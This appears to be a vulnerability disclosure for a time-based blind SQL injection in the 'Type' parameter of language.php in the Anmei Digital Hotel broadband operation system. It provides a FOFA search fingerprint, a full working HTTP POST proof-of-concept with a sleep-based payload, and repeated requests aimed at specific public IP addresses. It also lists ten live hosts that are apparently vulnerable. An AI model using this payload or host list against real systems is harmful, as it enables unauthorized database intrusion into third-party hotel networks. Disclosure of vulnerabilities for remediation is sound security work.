**Time blind injection type SQL injection exists in the Anmei Digital Hotel broadband operation system**

**Official website:   **[**http://www.amttgroup.com/**](http://www.amttgroup.com/)
**Function point: At the editing interface of the language configuration page language. php**
**Route: ip:port/language.php**
**The injection parameter: Type**
**Fofa syntax: icon_hash="1259797304"**
**The vulnerability verification data packet is as follows**

```
POST /language.php HTTP/1.1
Host: ip:port
Connection: Keep-alive
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4; dashboroad=srgua4gv7d2jnichvtl66l1146
Content-Length: 263
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)

EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&UID=add&submit=%20%E6%B7%BB%20%E5%8A%A0%20
```
**Vulnerability Case 1:**
[**https://113.140.76.67:6070/manager/login.php**](https://113.140.76.67:6070/manager/login.php)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/36030634/1701499749754-39d596ac-9556-4a37-8856-8c0935953394.png#averageHue=%2399b9d3&clientId=u95a6dc4b-efa8-4&from=paste&height=785&id=u20424b60&originHeight=981&originWidth=1612&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=299714&status=done&style=none&taskId=u84bbbd48-7e5b-42b9-a187-e904cb3371c&title=&width=1289.6)
**Construct vulnerability verification packets and successfully delay injection**
```
POST /language.php HTTP/1.1
Host: 113.140.76.67:6070
Connection: Keep-alive
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4; dashboroad=srgua4gv7d2jnichvtl66l1146
Content-Length: 267
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)

EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&UID=add&submit=%20%E6%B7%BB%20%E5%8A%A0%20
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/36030634/1701499722920-24ff721b-eecf-4e67-b379-3d57fcb65d29.png#averageHue=%23f9f7f7&clientId=u95a6dc4b-efa8-4&from=paste&height=674&id=u836fcc32&originHeight=843&originWidth=1580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=388228&status=done&style=none&taskId=uf0c4715f-9ee3-4069-9cb7-036ed30465f&title=&width=1264)
**Vulnerability Case 2:**
[**https://202.105.109.76:7070/manager/login.php**](https://202.105.109.76:7070/manager/login.php)
**Construct vulnerability verification packets and successfully delay injection**
```
POST /language.php HTTP/1.1
Host: 202.105.109.76:7070
Connection: Keep-alive
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4; dashboroad=srgua4gv7d2jnichvtl66l1146
Content-Length: 267
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)

EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&UID=add&submit=%20%E6%B7%BB%20%E5%8A%A0%20
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/36030634/1701499824396-edd67679-0ffb-430d-bda9-250cf232fcea.png#averageHue=%23f9f7f7&clientId=u95a6dc4b-efa8-4&from=paste&height=660&id=u9bdf3b23&originHeight=825&originWidth=1578&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=388316&status=done&style=none&taskId=u152bfd0b-21ed-48a7-b1f8-18d4e4719da&title=&width=1262.4)**Vulnerability Case 3:**
[**https://218.29.143.74:7071/manager/login.php**](https://218.29.143.74:7071/manager/login.php)
**Construct vulnerability verification packets and successfully delay injection**
```
POST /language.php HTTP/1.1
Host: 218.29.143.74:7071
Connection: Keep-alive
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=3n9dv7r0vl6fcvirnlvp2oh1t4; dashboroad=srgua4gv7d2jnichvtl66l1146
Content-Length: 265
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)

EditStatus=1&LangEName=pHqghUme&LangID=1&LangName=pHqghUme&LangType=0000%E7%B3%BB%E7%BB%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF&Lately=555-666-0606&Search=the&SerialID=1&Type=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z&UID=add&submit=%20%E6%B7%BB%20%E5%8A%A0%20

```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/36030634/1701499881158-e38995e4-a6be-4a54-bab1-5c51dec16a13.png#averageHue=%23f9f7f7&clientId=u95a6dc4b-efa8-4&from=paste&height=663&id=u1b78ab13&originHeight=829&originWidth=1580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=386822&status=done&style=none&taskId=u25a2cfad-42ec-4257-9c34-503246b9283&title=&width=1264)
**Other cases of vulnerabilities:**
[https://183.62.208.100:7070/manager/login.php](https://183.62.208.100:7070/manager/login.php)
[https://61.185.56.165:7080/manager/login.php](https://61.185.56.165:7080/manager/login.php)
[https://1.82.161.207:7080/manager/login.php](https://1.82.161.207:7080/manager/login.php)
[https://113.59.71.176:7070/manager/login.php](https://113.59.71.176:7070/manager/login.php)
[https://119.4.56.35:7070/manager/login.php](https://119.4.56.35:7070/manager/login.php)
[https://1.202.129.226:7070/manager/login.php](https://1.202.129.226:7070/manager/login.php)
[https://202.97.137.229:62443/manager/login.php](https://202.97.137.229:62443/manager/login.php)
